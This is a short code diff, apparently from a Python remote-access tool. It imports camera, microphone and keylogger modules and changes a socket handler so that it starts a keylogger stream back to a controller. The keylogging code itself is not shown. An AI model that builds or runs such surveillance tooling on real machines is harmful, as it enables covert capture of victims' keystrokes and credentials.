@@ -1,5 +1,6 @@
 from camera import *
 from microphone import *
+from keylogger import *
 
 async def open_file_manager(GUI,writer,reader):
     # 这里放具体的操作
@@ -57,9 +58,10 @@ async def start_keylogger(GUI,writer,reader):
     while(1):
         response = await reader.read(1024)
         if(response):
-            operation = "Im keylogger!"
+            operation = "Start keylogger!"
             writer.write(operation.encode())
             await writer.drain()
+            await start_keylogger_stream(writer, reader)
         else:
             writer.close()
             return
